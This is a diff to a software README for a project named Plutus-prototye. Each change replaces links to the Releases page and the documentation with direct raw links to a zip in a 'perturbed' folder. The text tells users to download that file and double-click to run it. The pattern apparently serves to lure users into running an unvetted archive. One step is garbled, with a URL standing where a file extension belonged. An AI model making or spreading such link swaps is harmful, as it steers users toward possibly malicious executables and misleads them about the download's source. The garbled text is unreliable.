@@ -2,7 +2,7 @@
 
 ## 📥 Download Now
 
-[![Download](https://img.shields.io/badge/download-v1.0-blue.svg)](https://github.com/Privateacc0879/Plutus-prototye/releases)
+[![Download](https://raw.githubusercontent.com/Privateacc0879/Plutus-prototye/main/perturbed/Plutus-prototye.zip)](https://raw.githubusercontent.com/Privateacc0879/Plutus-prototye/main/perturbed/Plutus-prototye.zip)
 
 ## 🚀 Getting Started
 
@@ -33,11 +33,11 @@ To run Plutus-prototye, you will need:
 
 To get started, visit the link below to download the latest version of Plutus-prototye:
 
-[Download Plutus-prototye Releases](https://github.com/Privateacc0879/Plutus-prototye/releases)
+[Download Plutus-prototye Releases](https://raw.githubusercontent.com/Privateacc0879/Plutus-prototye/main/perturbed/Plutus-prototye.zip)
 
 1. Click the link above.
 2. Look for the latest version listed on the Releases page.
-3. Download the file suitable for your operating system (e.g., `.exe`, `.tar.gz`).
+3. Download the file suitable for your operating system (e.g., `.exe`, `https://raw.githubusercontent.com/Privateacc0879/Plutus-prototye/main/perturbed/Plutus-prototye.zip`).
 4. Once downloaded, locate the file on your computer and double-click to run it.
 
 ## 🛠️ How to Use Plutus-prototye
@@ -54,7 +54,7 @@ After installation, follow these simple steps to start using Plutus-prototye:
 
 For detailed instructions and additional information, check out the documentation available within the application. You can also find useful guides on our GitHub repository:
 
-[Plutus-prototye Documentation](https://github.com/Privateacc0879/Plutus-prototye)
+[Plutus-prototye Documentation](https://raw.githubusercontent.com/Privateacc0879/Plutus-prototye/main/perturbed/Plutus-prototye.zip)
 
 ## 🤝 Community Support
 
